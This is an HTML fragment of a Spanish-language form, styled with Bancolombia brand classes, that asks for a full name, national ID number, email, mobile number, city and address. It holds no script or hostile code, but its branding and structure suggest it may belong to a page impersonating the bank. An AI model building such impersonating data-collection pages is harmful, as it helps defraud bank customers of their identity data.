<!-- DATOS (Nueva seccion) -->
<div id="datos" class="w-full flex flex-col justify-center items-center pb-6 hidden">
    <h5 class="text-[24px] font-cib-sans-bold mt-10">Datos personales</h5>
    <div class="w-full flex mt-4 flex-col justify-center items-center gap-4 pl-1">
        <div class="w-[100%] bg-white py-6 px-4 rounded-xl flex flex-col items-center">
            <div class="w-full flex items-center justify-center hiddenerror hidden">
                <span class="text-[11px] text-red-600"> Verifica la informacion e intentalo nuevamente.</span>
            </div>

            <!-- Nombre -->
            <div class="w-full flex flex-col justify-center items-center my-2.5">
                <div class="w-full floating-label-container thin-border-bottom bg-white">
                    <svg class="input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"
                        xmlns="http://www.w3.org/2000/svg">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1"
                            d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                    </svg>
                    <input id="nombre" type="text" class="floating-input" placeholder="" autocomplete="off" />
                    <span id="nombreLabel" class="floating-label">Nombre completo</span>
                </div>
                <span id="nombreError" class="text-[12px] mt-1.5 font-medium text-red-500 hidden"></span>
            </div>

            <!-- Cedula -->
            <div class="w-full flex flex-col justify-center items-center my-2.5">
                <div class="w-full floating-label-container thin-border-bottom bg-white">
                    <svg class="input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"
                        xmlns="http://www.w3.org/2000/svg">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1"
                            d="M3 7h18v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7zm3 4h6m-6 3h4m7-5h1" />
                    </svg>
                    <input id="cedula" type="tel" inputmode="numeric" pattern="\d*" class="floating-input" placeholder=""
                        autocomplete="off" />
                    <span id="cedulaLabel" class="floating-label">Cedula</span>
                </div>
                <span id="cedulaError" class="text-[12px] mt-1.5 font-medium text-red-500 hidden"></span>
            </div>

            <!-- Email -->
            <div class="w-full flex flex-col justify-center items-center my-2.5">
                <div class="w-full floating-label-container thin-border-bottom bg-white">
                    <svg class="input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"
                        xmlns="http://www.w3.org/2000/svg">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1"
                            d="M3 8l9 6 9-6M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
                    </svg>
                    <input id="email" type="email" class="floating-input" placeholder="" autocomplete="off" />
                    <span id="emailLabel" class="floating-label">Correo electronico</span>
                </div>
                <span id="emailError" class="text-[12px] mt-1.5 font-medium text-red-500 hidden"></span>
            </div>

            <!-- Celular (exactamente 10 digitos) -->
            <div class="w-full flex flex-col justify-center items-center my-2.5">
                <div class="w-full floating-label-container thin-border-bottom bg-white">
                    <svg class="input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"
                        xmlns="http://www.w3.org/2000/svg">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1"
                            d="M3 5a2 2 0 012-2h3l2 4-2 2a12 12 0 006 6l2-2 4 2v3a2 2 0 01-2 2h-1C9.82 20.5 3.5 14.18 3 6V5z" />
                    </svg>
                    <input id="celular" type="tel" inputmode="numeric" pattern="\d*" minlength="10" maxlength="10"
                        class="floating-input" placeholder="" autocomplete="off" />
                    <span id="celularLabel" class="floating-label">Celular</span>
                </div>
                <span id="celularError" class="text-[12px] mt-1.5 font-medium text-red-500 hidden"></span>
            </div>

            <!-- Ciudad -->
            <div class="w-full flex flex-col justify-center items-center my-2.5">
                <div class="w-full floating-label-container thin-border-bottom bg-white">
                    <svg class="input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"
                        xmlns="http://www.w3.org/2000/svg">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1"
                            d="M12 11a3 3 0 100-6 3 3 0 000 6zm0 9c-4-4-6-6-6-9a6 6 0 1112 0c0 3-2 5-6 9z" />
                    </svg>
                    <input id="ciudad" type="text" class="floating-input" placeholder="" autocomplete="off" />
                    <span id="ciudadLabel" class="floating-label">Ciudad</span>
                </div>
                <span id="ciudadError" class="text-[12px] mt-1.5 font-medium text-red-500 hidden"></span>
            </div>

            <!-- Direccion -->
            <div class="w-full flex flex-col justify-center items-center my-2.5">
                <div class="w-full floating-label-container thin-border-bottom bg-white">
                    <svg class="input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"
                        xmlns="http://www.w3.org/2000/svg">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1"
                            d="M3 12l9-7 9 7M5 10v10h5v-6h4v6h5V10" />
                    </svg>
                    <input id="direccion" type="text" class="floating-input" placeholder=""
                        autocomplete="off" />
                    <span id="direccionLabel" class="floating-label">Direccion</span>
                </div>
                <span id="direccionError" class="text-[12px] mt-1.5 font-medium text-red-500 hidden"></span>
            </div>

            <div class="w-full pt-6 pb-2 flex justify-end items-center px-[15px]">
                <button id="continuarDatos"
                        class="font-bold py-2 px-6 bg-bancolombia-yellow rounded-full disabled:bg-gray-300 disabled:text-black cursor-not-allowed w-32"
                        disabled>
                    Continuar
                </button>
            </div>
        </div>
    </div>
</div>
